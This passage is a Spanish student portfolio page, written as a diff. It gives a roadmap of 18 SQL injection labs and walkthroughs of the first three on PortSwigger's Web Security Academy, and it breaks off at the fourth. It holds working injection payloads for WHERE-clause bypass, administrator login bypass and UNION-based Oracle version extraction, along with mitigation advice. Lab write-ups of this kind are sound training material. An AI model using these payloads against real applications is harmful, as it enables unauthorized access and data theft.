@@ -1,0 +1,1938 @@
+<!DOCTYPE HTML>
+<html lang="es">
+<head>
+    <title>SQL Injection Roadmap - Actividad 04</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    
+    <link rel="stylesheet" href="../assets/css/fontawesome-all.min.css" />
+    <link rel="stylesheet" href="../assets/css/estilo_actividades.css" />
+    <link rel="stylesheet" href="../assets/css/estilo_actividades.css" />
+<link rel="stylesheet" href="../assets/css/labs.css" />
+    <style>
+        html {
+            scroll-behavior: smooth;
+        }
+        /* Evita que el header tape los títulos al navegar */
+        .lab-card {
+            scroll-margin-top: 100px;
+        }
+        /* Estilo para los enlaces del roadmap */
+        .roadmap-link {
+            text-decoration: none;
+            color: inherit;
+            display: block;
+            transition: transform 0.3s ease;
+        }
+        .roadmap-link:hover {
+            transform: translateY(-5px);
+        }
+    </style>
+</head>
+<body>
+
+    <header id="header-superior">
+        <div class="logo">CNO V: SEGURIDAD INFORMÁTICA</div>
+        <nav>
+            <a href="../index.html">Inicio</a> 
+            <a href="Laboratorios.pdf" class="btn-download" download="Documento">
+                <i class="fas fa-file-pdf"></i> Descargar Documento
+            </a>
+        </nav>
+    </header>
+
+    <section class="hero">
+        <div class="hero-text">
+            <p>PORTAFOLIO DIGITAL - 177203</p>
+            <h1>SQL Injection Roadmap</h1>
+            <p style="font-size: 1.1rem; opacity: 0.8;">Laboratorios de Explotación y Mitigación</p>
+        </div>
+        <div class="wave-shape">
+            <svg viewBox="0 0 1440 320" preserveAspectRatio="none">
+                <path fill="#ffffff" d="M0,192L60,197.3C120,203,240,213,360,192C480,171,600,117,720,112C840,107,960,149,1080,165.3C1200,181,1320,171,1380,165.3L1440,160L1440,320L1380,320C1320,320,1200,320,1080,320C960,320,840,320,720,320C600,320,480,320,360,320C240,320,120,320,60,320L0,320Z"></path>
+            </svg>
+        </div>
+    </section>
+
+  <main class="roadmap-main" style="padding: 40px 20px;">
+    <div class="timeline-v-line"></div>
+    <div class="roadmap-grid">
+        
+        <div class="roadmap-item floating-1">
+            <a href="#lab-1" class="roadmap-link">
+                <div class="step-node">01</div>
+                <article class="glass-card">
+                    <div class="card-inner">
+                        <span class="cyber-label">Pág. 18</span>
+                        <h3>SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</h3>
+                        <p>Modify a query to return all products, including unreleased ones.</p>
+                    </div>
+                </article>
+            </a>
+        </div>
+
+        <div class="roadmap-item floating-2">
+            <a href="#lab-2" class="roadmap-link">
+                <div class="step-node">02</div>
+                <article class="glass-card">
+                    <div class="card-inner">
+                        <span class="cyber-label">Pág. 22</span>
+                        <h3>SQL injection vulnerability allowing login bypass</h3>
+                        <p>Log in as the administrator user without knowing the password.</p>
+                    </div>
+                </article>
+            </a>
+        </div>
+
+        <div class="roadmap-item floating-1">
+            <a href="#lab-3" class="roadmap-link">
+                <div class="step-node">03</div>
+                <article class="glass-card">
+                    <div class="card-inner">
+                        <span class="cyber-label">Pág. 27</span>
+                        <h3>SQL injection attack, querying the database type and version on Oracle</h3>
+                        <p>Identify the specific database version using UNION queries on Oracle.</p>
+                    </div>
+                </article>
+            </a>
+        </div>
+
+        <div class="roadmap-item floating-2">
+            <a href="#lab-4" class="roadmap-link">
+                <div class="step-node">04</div>
+                <article class="glass-card">
+                    <div class="card-inner">
+                        <span class="cyber-label">Pág. 33</span>
+                        <h3>SQL injection attack, querying the database type and version on MySQL and Microsoft</h3>
+                        <p>Identify the database version on MySQL and Microsoft SQL Server.</p>
+                    </div>
+                </article>
+            </a>
+        </div>
+
+        <div class="roadmap-item floating-1">
+            <a href="#lab-5" class="roadmap-link">
+                <div class="step-node">05</div>
+                <article class="glass-card">
+                    <div class="card-inner">
+                        <span class="cyber-label">Pág. 40</span>
+                        <h3>SQL injection attack, listing the database contents on non-Oracle databases</h3>
+                        <p>Extract table and column names to retrieve sensitive data.</p>
+                    </div>
+                </article>
+            </a>
+        </div>
+
+        <div class="roadmap-item floating-2">
+            <a href="#lab-6" class="roadmap-link">
+                <div class="step-node">06</div>
+                <article class="glass-card">
+                    <div class="card-inner">
+                        <span class="cyber-label">Pág. 49</span>
+                        <h3>SQL injection attack, listing the database contents on Oracle</h3>
+                        <p>Enumerate schema information on Oracle databases.</p>
+                    </div>
+                </article>
+            </a>
+        </div>
+
+        <div class="roadmap-item floating-1">
+            <a href="#lab-7" class="roadmap-link">
+                <div class="step-node">07</div>
+                <article class="glass-card">
+                    <div class="card-inner">
+                        <span class="cyber-label">Pág. 59</span>
+                        <h3>SQL injection UNION attack, determining the number of columns returned by the query</h3>
+                        <p>Use ORDER BY or UNION SELECT NULL to count columns.</p>
+                    </div>
+                </article>
+            </a>
+        </div>
+
+        <div class="roadmap-item floating-2">
+            <a href="#lab-8" class="roadmap-link">
+                <div class="step-node">08</div>
+                <article class="glass-card">
+                    <div class="card-inner">
+                        <span class="cyber-label">Pág. 65</span>
+                        <h3>SQL injection UNION attack, finding a column containing text</h3>
+                        <p>Identify which column can hold string data to extract text values.</p>
+                    </div>
+                </article>
+            </a>
+        </div>
+
+        <div class="roadmap-item floating-1">
+            <a href="#lab-9" class="roadmap-link">
+                <div class="step-node">09</div>
+                <article class="glass-card">
+                    <div class="card-inner">
+                        <span class="cyber-label">Pág. 73</span>
+                        <h3>SQL injection UNION attack, retrieving data from other tables</h3>
+                        <p>Extract username and password credentials from the database.</p>
+                    </div>
+                </article>
+            </a>
+        </div>
+
+        <div class="roadmap-item floating-2">
+            <a href="#lab-10" class="roadmap-link">
+                <div class="step-node">10</div>
+                <article class="glass-card">
+                    <div class="card-inner">
+                        <span class="cyber-label">Pág. 81</span>
+                        <h3>SQL injection UNION attack, retrieving multiple values in a single column</h3>
+                        <p>Concatenate multiple results into a single string output.</p>
+                    </div>
+                </article>
+            </a>
+        </div>
+
+        <div class="roadmap-item floating-1">
+            <a href="#lab-11" class="roadmap-link">
+                <div class="step-node">11</div>
+                <article class="glass-card">
+                    <div class="card-inner">
+                        <span class="cyber-label">Pág. 85</span>
+                        <h3>Blind SQL injection with conditional responses</h3>
+                        <p>Extract data by observing changes in the page's response.</p>
+                    </div>
+                </article>
+            </a>
+        </div>
+
+        <div class="roadmap-item floating-2">
+            <a href="#lab-12" class="roadmap-link">
+                <div class="step-node">12</div>
+                <article class="glass-card">
+                    <div class="card-inner">
+                        <span class="cyber-label">Pág. 94</span>
+                        <h3>Blind SQL injection with conditional errors</h3>
+                        <p>Trigger database errors to leak information character by character.</p>
+                    </div>
+                </article>
+            </a>
+        </div>
+
+        <div class="roadmap-item floating-1">
+            <a href="#lab-13" class="roadmap-link">
+                <div class="step-node">13</div>
+                <article class="glass-card">
+                    <div class="card-inner">
+                        <span class="cyber-label">Pág. 101</span>
+                        <h3>Visible error-based SQL injection</h3>
+                        <p>Induce and read specific SQL errors to leak data directly.</p>
+                    </div>
+                </article>
+            </a>
+        </div>
+
+        <div class="roadmap-item floating-2">
+            <a href="#lab-14" class="roadmap-link">
+                <div class="step-node">14</div>
+                <article class="glass-card">
+                    <div class="card-inner">
+                        <span class="cyber-label">Pág. 105</span>
+                        <h3>Blind SQL injection with time delays</h3>
+                        <p>Identify a vulnerability by forcing the database to wait before responding.</p>
+                    </div>
+                </article>
+            </a>
+        </div>
+
+        <div class="roadmap-item floating-1">
+            <a href="#lab-15" class="roadmap-link">
+                <div class="step-node">15</div>
+                <article class="glass-card">
+                    <div class="card-inner">
+                        <span class="cyber-label">Pág. 110</span>
+                        <h3>Blind SQL injection with time delays and information retrieval</h3>
+                        <p>Extract the administrator password using time-based techniques.</p>
+                    </div>
+                </article>
+            </a>
+        </div>
+
+        <div class="roadmap-item floating-2">
+            <a href="#lab-16" class="roadmap-link">
+                <div class="step-node">16</div>
+                <article class="glass-card">
+                    <div class="card-inner">
+                        <span class="cyber-label">Pág. 118</span>
+                        <h3>Blind SQL injection with out-of-band interaction</h3>
+                        <p>Trigger a DNS lookup to confirm a vulnerability exists.</p>
+                    </div>
+                </article>
+            </a>
+        </div>
+
+        <div class="roadmap-item floating-1">
+            <a href="#lab-17" class="roadmap-link">
+                <div class="step-node">17</div>
+                <article class="glass-card">
+                    <div class="card-inner">
+                        <span class="cyber-label">Pág. 123</span>
+                        <h3>Blind SQL injection with out-of-band data exfiltration</h3>
+                        <p>Exfiltrate sensitive data via DNS queries to a controlled server.</p>
+                    </div>
+                </article>
+            </a>
+        </div>
+
+        <div class="roadmap-item floating-2">
+            <a href="#lab-18" class="roadmap-link">
+                <div class="step-node">18</div>
+                <article class="glass-card">
+                    <div class="card-inner">
+                        <span class="cyber-label">Pág. 127</span>
+                        <h3>SQL injection with filter bypass via XML encoding</h3>
+                        <p>Bypass security filters by obfuscating the payload within XML data.</p>
+                    </div>
+                </article>
+            </a>
+        </div>
+        <article class="lab-card" id="lab-1">
+            <header class="lab-header">
+                <span class="badge apprentice">Nivel: Apprentice</span>
+                <h2>Laboratorios APPRENTICE: 1. SQL Injection vulnerability in WHERE clause allowing retrieval of hidden data</h2>
+            </header>
+
+            <div class="highlight-box">
+                <p><strong>Tipo de SQLi:</strong> SQL Injection basada en manipulación lógica (Boolean-Based SQL Injection) en la cláusula WHERE.</p>
+                <p>Se trata de una inyección que altera la lógica de la consulta SQL agregando una condición siempre verdadera (OR 1=1), lo que provoca que la cláusula WHERE devuelva todos los registros de la tabla.</p>
+                <p><strong>También puede clasificarse como:</strong></p>
+                <ul>
+                    <li>In-band SQL Injection</li>
+                    <li>Boolean-based SQLi</li>
+                    <li>SQLi en parámetro GET</li>
+                    <li>SQLi en cláusula WHERE</li>
+                </ul>
+                
+            </div>
+
+            <div class="lab-content">
+                <h3><i class="fas fa-crosshairs"></i> Objetivo</h3>
+                <p>El objetivo fue modificar la cláusula WHERE para que la condición evaluara como verdadera en todos los casos, permitiendo la recuperación de datos que normalmente no serían visibles para el usuario.</p>
+
+                <div class="diagram-container">
+                    <div class="step-box"><i class="fas fa-sign-in-alt"></i><p>Acceso</p></div>
+                    <div class="arrow-divider"><i class="fas fa-arrow-right"></i></div>
+                    <div class="step-box"><i class="fas fa-search"></i><p>Interceptar</p></div>
+                    <div class="arrow-divider"><i class="fas fa-arrow-right"></i></div>
+                    <div class="step-box"><i class="fas fa-edit"></i><p>Payload</p></div>
+                    <div class="arrow-divider"><i class="fas fa-arrow-right"></i></div>
+                    <div class="step-box"><i class="fas fa-check-double"></i><p>Solved</p></div>
+                </div>
+
+                <h3><i class="fas fa-terminal"></i> Procedimiento</h3>
+
+                <div class="step-detail">
+                    <h4>1. Acceso y Análisis Inicial</h4>
+                    <p>Primero ingresamos al laboratorio desde Web Security Academy y copiamos la URL generada automáticamente. El objetivo del laboratorio era explotar una vulnerabilidad de SQL Injection en la cláusula WHERE, con el fin de recuperar datos ocultos (productos que normalmente no se muestran).</p>
+                    <p>Cuando cargamos la página vemos una tienda con filtros por categoría como:</p>
+                    <div class="category-list">
+                        <span class="category-tag">Clothing</span>
+                        <span class="category-tag">Corporate gifts</span>
+                        <span class="category-tag">Food & Drink</span>
+                        <span class="category-tag">Lifestyle</span>
+                    </div>
+                </div>
+                
+
+                <div class="step-detail">
+                    <h4>2. Configuración de Burp Suite</h4>
+                    <p>Abrimos Burp Suite Community Edition y nos dirigimos a: <strong>Proxy → Intercept</strong></p>
+                    <ul>
+                        <li>Activamos la opción <strong>Intercept is on</strong></li>
+                        <li>Seleccionamos <strong>Open browser</strong></li>
+                    </ul>
+                    <p>Esto abre el navegador interno de Burp, el cual pasa todo el tráfico HTTP a través del proxy para poder interceptarlo y modificarlo.</p>
+                </div>
+                        <div class="evidencia-container" style="text-align: center; margin-top: 20px;">
+                            <img src="sql/LAB1.1.png" alt="Captura de pantalla SQL Injection Solved" class="evidencia-img" style="max-width: 100%; border-radius: 8px; border: 1px solid #ddd; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
+                        </div>
+                <div class="step-detail">
+                    <h4>3. Intercepción en el Navegador Interno</h4>
+                    <ul>
+                        <li>Pegamos la URL del laboratorio</li>
+                        <li>La solicitud fue interceptada automáticamente por Burp</li>
+                        <li>Hacemos clic en <strong>Forward all</strong> para permitir que la petición llegue al servidor</li>
+                    </ul>
+                    <p>Esto permitió que la página cargara correctamente dentro del navegador de Burp.</p>
+                </div>
+                        <div class="evidencia-container" style="text-align: center; margin-top: 20px;">
+                            <img src="sql/LAB1.2.png" alt="Captura de pantalla SQL Injection Solved" class="evidencia-img" style="max-width: 100%; border-radius: 8px; border: 1px solid #ddd; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
+                        </div>
+                <div class="step-detail">
+                    <h4>4. Identificación del Vector</h4>
+                    <p>Después hacemos clic en la categoría: <strong>Corporate gifts</strong>. En ese momento Burp interceptó una petición como esta:</p>
+                    <div class="code-block">GET /filter?category=Corporate+gifts HTTP/2</div>
+                    <p>Aquí identifiqué que el parámetro se envía en la URL y es usado para filtrar productos. Este tipo de parámetro suele insertarse directamente en consultas SQL como:</p>
+                    <div class="code-block">SELECT * FROM products WHERE category = 'Gifts' AND released = 1</div>
+                    <p>Si la aplicación no valida correctamente el input, puede ser vulnerable a SQL Injection.</p>
+                </div>
+                
+                <div class="step-detail">
+                    <h4>5. Uso del Repeater</h4>
+                    <p>Para poder modificar manualmente la petición:</p>
+                    <ul>
+                        <li>Hacemos clic derecho sobre la solicitud interceptada</li>
+                        <li>Seleccionamos <strong>Send to Repeater</strong></li>
+                        <li>Vamos a la pestaña <strong>Repeater</strong></li>
+                    </ul>
+                    <p>El Repeater permite modificar y reenviar solicitudes múltiples veces para probar diferentes cargas útiles (payloads).</p>
+                </div>
+
+                <div class="step-detail">
+                    <h4>6. Modificación del Parámetro (Payload)</h4>
+                    <p>En el Repeater modificamos la primera línea donde aparece el parámetro category. Originalmente estaba así:</p>
+                    <ul>
+                        <li><code>GET /filter?category=Corporate+gifts HTTP/2</code></li>
+                    </ul>
+                    <p>Lo modificamos agregando el payload <code>'+OR+1=1--</code> quedando así:</p>
+                    <div class="code-block">GET /filter?category=Corporate+gifts'+OR+1=1-- HTTP/2</div>
+                </div>
+                    <div class="evidencia-container" style="text-align: center; margin-top: 20px;">
+                    <img src="sql/lab1.4.png" alt="Captura de pantalla SQL Injection Solved" class="evidencia-img" style="max-width: 100%; border-radius: 8px; border: 1px solid #ddd; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
+                </div>
+                <div class="step-detail">
+                    <h4>7. Ejecución y Resultados</h4>
+                    <p>Después de enviar la petición modificada:</p>
+                    <ul>
+                        <li>La respuesta HTTP fue <strong>200 OK</strong></li>
+                        <li>En el cuerpo de la respuesta aparecieron productos que normalmente no se muestran</li>
+                    </ul>
+                </div>
+
+                <div class="step-detail">
+                    <h4>8. Confirmación Final</h4>
+                    <p>El laboratorio marcó el estado como <strong>Solved</strong>. Esto confirma que:</p>
+                    <ul>
+                        <li>La aplicación era vulnerable</li>
+                        <li>Se logró recuperar información oculta</li>
+                        <li>La inyección fue exitosa</li>
+                    </ul>
+                </div>
+                    <div class="evidencia-container" style="text-align: center; margin-top: 20px;">
+                    <img src="sql/lab1.5.png" alt="Captura de pantalla SQL Injection Solved" class="evidencia-img" style="max-width: 100%; border-radius: 8px; border: 1px solid #ddd; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
+                </div></article>
+                <article class="lab-card" id="lab-2">
+    <header class="lab-header">
+        <span class="badge apprentice">Nivel: Apprentice</span>
+        <h2>2. SQL Injection vulnerability allowing login bypass</h2>
+    </header>
+
+    <div class="highlight-box">
+        <p><strong>Tipo de SQLi:</strong> Error-based / Classic SQL Injection</p>
+        <p><strong>Vulnerabilidad:</strong> El formulario de login construye una consulta SQL dinámica concatenando directamente los valores de los campos username y password sin sanitización ni uso de sentencias preparadas.</p>
+        <p>La consulta típica es del tipo: <code>SELECT * FROM users WHERE username = 'input_username' AND password = 'input_password'</code></p>
+        <p>Al inyectar un cierre de comilla simple (<code>'</code>) en el campo username seguido de un comentario SQL (<code>--</code>), se altera la lógica: el <code>--</code> comenta el resto de la consulta (incluyendo la verificación de contraseña), convirtiendo la condición en verdadera siempre que exista el usuario administrator.</p>
+        <p>Esto permite bypass de autenticación sin necesidad de conocer la contraseña, aprovechando que la aplicación no escapa caracteres especiales y refleja errores o resultados directamente. Se trata de una inyección in-band clásica con manipulación lógica (no requiere UNION ni extracción de datos adicionales).</p>
+    </div>
+
+    <div class="lab-content">
+        <h3><i class="fas fa-crosshairs"></i> Objetivo</h3>
+        <p>Explotar una vulnerabilidad SQL Injection en el formulario de login para autenticarse como el usuario <strong>administrator</strong> sin conocer su contraseña real, modificando la lógica de la consulta SQL de autenticación y logrando acceso no autorizado a la aplicación.</p>
+
+        <div class="diagram-container">
+            <div class="step-box"><i class="fas fa-user-lock"></i><p>Login</p></div>
+            <div class="arrow-divider"><i class="fas fa-arrow-right"></i></div>
+            <div class="step-box"><i class="fas fa-quote-right"></i><p>Payload</p></div>
+            <div class="arrow-divider"><i class="fas fa-arrow-right"></i></div>
+            <div class="step-box"><i class="fas fa-comment-slash"></i><p>Bypass</p></div>
+            <div class="arrow-divider"><i class="fas fa-arrow-right"></i></div>
+            <div class="step-box"><i class="fas fa-unlock-alt"></i><p>Admin Access</p></div>
+        </div>
+
+        <h3><i class="fas fa-terminal"></i> Procedimiento</h3>
+
+        <div class="step-detail">
+            <h4>Paso 1: Ir a la sección de My Account</h4>
+            <p>Accedemos al portal de autenticación del laboratorio.</p>
+        </div>
+<div class="evidencia-container" style="text-align: center; margin-top: 20px;">
+                    <img src="sql/lab1.6.png" alt="Captura de pantalla SQL Injection Solved" class="evidencia-img" style="max-width: 100%; border-radius: 8px; border: 1px solid #ddd; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
+                </div>
+        <div class="step-detail">
+            <h4>Paso 2: Ingresar el Payload en Username</h4>
+            <p>Ingresar en el campo Username: <code>administrator'--</code></p>
+            <p>(El cierre de comilla simple termina la cadena del username, y <code>--</code> comenta el resto de la consulta, incluyendo la cláusula <code>AND password = '...'</code>).</p>
+        </div>
+<div class="evidencia-container" style="text-align: center; margin-top: 20px;">
+                    <img src="sql/lab1.7.png" alt="Captura de pantalla SQL Injection Solved" class="evidencia-img" style="max-width: 100%; border-radius: 8px; border: 1px solid #ddd; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
+                </div>
+        <div class="step-detail">
+            <h4>Paso 3: Campo Password</h4>
+            <p>Ingresar en el campo Password: cualquier valor arbitrario (ej. 123, vacío o lo que sea).</p>
+        </div>
+<div class="evidencia-container" style="text-align: center; margin-top: 20px;">
+                    <img src="sql/lab1.8.png" alt="Captura de pantalla SQL Injection Solved" class="evidencia-img" style="max-width: 100%; border-radius: 8px; border: 1px solid #ddd; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
+                </div>
+        <div class="step-detail">
+            <h4>Paso 4: Enviar el formulario (Log in)</h4>
+            <p>La consulta efectiva se convierte en algo como:</p>
+            <div class="code-block">
+                SELECT * FROM users WHERE username = 'administrator'--' AND password = 'cualquiercosa'
+            </div>
+            <p>El <code>--</code> comenta todo lo posterior, por lo que la condición se reduce a <code>username = 'administrator'</code>, autenticando como administrador si el usuario existe.</p>
+        </div>
+<div class="evidencia-container" style="text-align: center; margin-top: 20px;">
+                    <img src="sql/lab1.9.png" alt="Captura de pantalla SQL Injection Solved" class="evidencia-img" style="max-width: 100%; border-radius: 8px; border: 1px solid #ddd; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
+                </div>
+        <div class="highlight-box" style="border-left-color: #00a3e0; background: #f0faff;">
+            <h3>Explicación del payload</h3>
+            <p>El payload principal utilizado es: <strong>Username: administrator'--</strong> | <strong>Password: cualquier valor arbitrario</strong></p>
+            <ul>
+                <li>El carácter <strong>'</strong> cierra la cadena literal del campo username en la consulta SQL original.</li>
+                <li>El operador <strong>--</strong> inicia un comentario de línea en SQL, descartando todo el código restante de la consulta, incluyendo la cláusula <code>AND password = '...'</code>.</li>
+                <li>Como resultado, la consulta efectiva se reduce a: <code>SELECT * FROM users WHERE username = 'administrator'</code></li>
+                <li>Esta condición es verdadera si el usuario administrator existe en la tabla, permitiendo autenticación exitosa sin verificar la contraseña.</li>
+            </ul>
+            <p>El payload explota la concatenación insegura de entradas en la consulta SQL y la falta de escape de caracteres especiales, logrando un bypass lógico de la autenticación sin necesidad de extraer datos ni usar técnicas más avanzadas como UNION o blind injection.</p>
+        </div>
+
+        <section class="mitigacion-section">
+            <h3><i class="fas fa-shield-alt"></i> Mitigación recomendada</h3>
+            <div class="mitigacion-card">
+                <ul>
+                    <li>Implementar <strong>consultas parametrizadas</strong> o sentencias preparadas en el código de autenticación (ej. <code>PreparedStatement</code> en Java, <code>cursor.execute()</code> con placeholders en Python, <code>PDO</code> en PHP).</li>
+                    <li>Realizar <strong>validación estricta de entradas</strong> en username y password (longitud máxima, caracteres permitidos mediante regex, prohibición explícita de comillas simples y guiones dobles <code>--</code>).</li>
+                    <li>Almacenar contraseñas con <strong>hashing seguro</strong> (bcrypt, Argon2, PBKDF2) y nunca comparar contraseñas en texto plano.</li>
+                    <li>Aplicar el <strong>principio de menor privilegio</strong> en la cuenta de base de datos utilizada por la aplicación.</li>
+                    <li>Desplegar un <strong>Web Application Firewall (WAF)</strong> con reglas para detectar patrones comunes de SQLi (comillas, <code>--</code>, <code>OR 1=1</code>).</li>
+                </ul>
+            </div>
+        </section>
+    </div>
+</article>
+<article class="lab-card" id="lab-3">
+    <header class="lab-header">
+        <h2>3. SQL Injection attack, querying the database type version on Oracle</h2>
+            <span class="badge practitioner" style="background: #f2994a;">Nivel: PRACTITIONER</span>
+    </header>
+
+    <div class="highlight-box">
+        <p><strong>Tipo de SQLi:</strong> UNION-based SQL Injection</p>
+        <p><strong>Objetivo:</strong> Explotar una vulnerabilidad de SQL Injection basada en UNION para obtener y mostrar la versión de la base de datos Oracle.</p>
+
+        <p><strong>Vulnerabilidad:</strong> La aplicación construye una consulta SQL concatenando directamente el parámetro category sin validación adecuada, permitiendo insertar código SQL adicional.</p>
+        <p><strong>Ejemplo conceptual vulnerable:</strong></p>
+        <div class="code-block">SELECT name, description FROM products WHERE category = 'Accessories'</div>
+
+        <p><strong>El atacante lo convierte en:</strong></p>
+        <div class="code-block">SELECT name, description FROM products WHERE category = '' UNION SELECT banner, NULL FROM v$version--</div>
+    </div>
+
+    <div class="lab-content">
+        <h3><i class="fas fa-terminal"></i> Procedimiento</h3>
+
+        <div class="step-detail">
+            <h4>Paso 1: Interceptar la petición con Burp Suite</h4>
+            <p>Una vez abierto el laboratorio y dentro de Burp Suite, usaremos el navegador de este el cual es Chromium.</p>
+            <p>Dentro de Chromium entraremos con la url del laboratorio.</p>
+            <p>Volviendo a Burp Suite activamos intercept off, para así interceptar la petición.</p>
+                    <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+            <img src="sql/LAB3.1.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+        </div>
+            <p>Así se verá Burp Suite cuando haya interceptado peticiones:</p>
+                    <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/LAB3.2.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+            <p>Dentro del navegador de Chromium en la pagina del laboratorio, vamos a cambiar la categoria de productos, en este caso a Gifts, para hacer el tipo de petición que necesitamos, ya que ese parametro de category es vulnerable.</p>
+        </div>
+        <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/LAB3.3.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                    <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/LAB3.4.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>Paso 2: Confirmar que es vulnerable a SQLi</h4>
+            <p>Para confirmar que ese parametro es vulnerable a SQLi, enviamos la petición al repetidor, dentro de Burp Suite y la modificamos cambiando la categoría “Gift”, por el símbolo: <strong>‘</strong></p>
+        </div>
+<div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/LAB3.5.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+                    <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/LAB3.6.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+            <p>Como resultado de repetir la petición modificada, el servidor respondió con un un error, lo cual indica que es vulnerable ya que se rompió la consulta (muy buena señal de SQLi).</p>
+                    <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/LAB3.7.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>Paso 3: Encontrar el número de columnas</h4>
+            <p>Una vez que confirmamos que es vulnerable a SQLi, vamos a hacer una consulta haciendo una inyeccion de codigo SQL de tipo:</p>
+            <div class="code-block">'+UNION+SELECT+NULL,NULL+FROM+dual--</div>
+            <p>para obtener el número de columnas. Y obtenemos: Lo cual nos devuelve 2 columnas.</p>
+        </div>
+                <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/LAB3.8.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+        <div class="step-detail">
+            <h4>Paso 4: Ver cuáles columnas aceptan texto</h4>
+            <p>En este paso se verfica que columnas acepten datos de tipo texto, usando de nuevo el repetidor y la consulta:</p>
+            <div class="code-block">'+UNION+SELECT+'abc','def'+FROM+dual--</div>
+            <p>Se usa “abc”, y “def” para verificar que efectivamente acepte datos de tipo texto, y se obtiene lo siguiente:</p>
+            <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/LAB3.10.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+            <p>Esto indica que efectivamente las columnas aceptan datos de tipo texto ya que la respuesta fue = “200 ok” y la inyección funciono correctamente.</p>
+        </div>
+
+        <div class="step-detail">
+            <h4>Paso 5: Extraer la versión de Oracle</h4>
+            <p>Payload final, se envia la petición de:</p>
+            <div class="code-block">'+UNION+SELECT+BANNER,+NULL+FROM+v$version--</div>
+            <p>Esto con el objetivo de mostrar la versión de la base de datos Oracle en la página.</p>
+            <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/LAB3.11.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+            <p>Se extrajo información sensible directamente desde la base de datos como:</p>
+            <ul>
+                <li>Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production</li>
+            </ul>
+            <p>Y también:</p>
+            <ul>
+                <li>CORE 11.2.0.2.0 Production</li>
+                <li>PL/SQL Release 11.2.0.2.0</li>
+                <li>TNS for Linux Version 11.2.0.2.0</li>
+                <li>NLSRTL Version 11.2.0.2.0</li>
+            </ul>
+            <p>Todo eso viene de: <strong>v$version</strong></p>
+        </div>
+
+        <div class="highlight-box" style="border-left: 5px solid #f2994a; background: #fff9f0;">
+            <h3>Laboratorio completado</h3>
+            <div class="evidencia-container" style="text-align: center; margin: 25px 0;">
+                        <img src="sql/LAB3.12.png" alt="Evidencia Oracle Version" class="evidencia-img" style="max-width: 100%; border-radius: 8px;">
+                    </div>
+            <p><strong>Payload usado:</strong> <code>'+UNION+SELECT+BANNER,+NULL+FROM+v$version--</code></p>
+            <ul>
+                <li><strong>'</strong> → Cierra la cadena original del WHERE.</li>
+                <li><strong>UNION SELECT</strong> → Añade una consulta controlada por el atacante.</li>
+                <li><strong>BANNER</strong> → Extrae la versión de Oracle.</li>
+                <li><strong>FROM v$version</strong> → Consulta una vista interna del sistema.</li>
+                <li><strong>--</strong> → Comenta el resto de la consulta original.</li>
+            </ul>
+            <p><strong>Resultado:</strong> La aplicación muestra la versión de la base de datos en pantalla.</p>
+        </div>
+
+        <section class="mitigacion-section">
+            <h3><i class="fas fa-shield-alt"></i> Mitigación recomendada</h3>
+            <div class="mitigacion-card">
+                <p>Usar consultas preparadas (Prepared Statements)</p>
+                <p>Ejemplo:</p>
+                <div class="code-block">SELECT name, description FROM products WHERE category = ?</div>
+                <p>Esto evita que la entrada del usuario se ejecute como código SQL.</p>
+                <p>Ademas:</p>
+                <ul>
+                    <li>Validación estricta de entrada (whitelist)</li>
+                    <li>Principio de mínimo privilegio en la base de datos</li>
+                    <li>No mostrar errores SQL al usuario</li>
+                    <li>WAF (como capa adicional, no como solución principal)</li>
+                </ul>
+                <hr>
+                <p><strong>Vulnerabilidad:</strong> SQL Injection basada en UNION</p>
+                <p><strong>Impacto:</strong> Exposición de información sensible (versión del DBMS)</p>
+                <p><strong>Solución:</strong> Consultas parametrizadas</p>
+            </div>
+        </section>
+    </div>
+</article>
+<article class="lab-card" id="lab-4">
+    <header class="lab-header">
+        <span class="badge practitioner" style="background: #f2994a;">Nivel: PRACTITIONER</span>
+        <h2>4. SQL injection attack, querying the database type and version on MySQL and Microsoft</h2>
+    </header>
+
+    <div class="highlight-box">
+        <p><strong>Tipo de SQLi:</strong> Es una SQL Injection basada en UNION (UNION-based SQLi).</p>
+        <p><strong>Objetivo:</strong> Mostrar la versión de la base de datos usando un ataque UNION-based SQL Injection.</p>
+
+        <p><strong>Vulnerabilidad:</strong> La vulnerabilidad está en el parámetro <code>category</code> del filtro de productos.</p>
+        <p>Probablemente la aplicación ejecuta algo como:</p>
